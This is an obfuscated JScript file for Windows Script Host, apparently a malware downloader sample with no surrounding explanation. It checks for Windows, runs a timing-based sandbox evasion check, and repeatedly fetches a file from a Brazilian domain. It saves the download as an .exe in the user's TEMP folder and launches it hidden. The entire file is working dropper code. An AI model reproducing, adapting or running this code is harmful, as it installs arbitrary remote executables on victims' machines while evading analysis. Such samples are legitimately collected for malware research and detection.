var I = false;
var DW = "CreateObject";
var JQ = function FZ() {return WScript[DW]("WScript.Shell");}(), M = 11;
var gE = "MSXML2.XMLHTTP";
var m = 2123213;
var K0 = 0;
function R(K1){JQ["Run"](K1, K0, K0);};
function j(){return "" + gE;};
function K(pa, s){K0 = K0 * 1; return pa - s;};
function aT(){return DW;};
/*@cc_on
  @if (@_win32 || @_win64)
    I = true;
  @end
@*/
if (I)
{
var E = "";
function bO(){return 22;};
var g = 0; var i = 0;
function YS()
{
var Kd = new this["Date"]();
var y = Kd["getUTCMilliseconds"]();
WScript["Sleep"](bO());
var Kd = new this["Date"]();
var c = Kd["getUTCMilliseconds"]();
WScript["Sleep"](bO());
var Kd = new this["Date"]();
var NP = Kd["getUTCMilliseconds"]();
var g = "d";
g = K(c, y);
var i = "eU";
i = K(NP, c);
E = "open";
return K(g, i);
}
var Da = false;
var R0 = false;
for (var x = K0; x < bO() * 1; x++){if (YS() != K0){
Da = true; 
i = "31" + 11 * g + i; 
R0 = true; 
break;
}}
function Z() {return ((Da == true) && (Da == R0)) ? 1 : K0;};
if (Da && Z() && R0){
function DB() {return JQ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "dBooZ2WJjd16so.exe";};
 w = j();
 En = WScript[DW](w);
 var XK = 1;
 while (XK){
try {
En[E]("GET", "http://lojaagrometal.com.br/mi3sa", false);
En["send"]();
q = "Sleep";
for (;;){WScript[q](bO() * 11); if (En["readystate"] >= 2 * 2) break;};
XK = K0;
} catch(KU){};
}
function kq(rh) {var l = (1, 2, 3, 4, 5, rh); return l;};
wv = WScript[aT()]("ADODB.Stream");
w = wv;
w[E]();
w["type"] = kq(1);
w["write"](En["ResponseBody"]);
wv["position"] = kq(K0);
w["Save" + "ToFile"](DB(), 2);
wv["c"+"lose"]();
dz = DB();
R(dz);
}
}

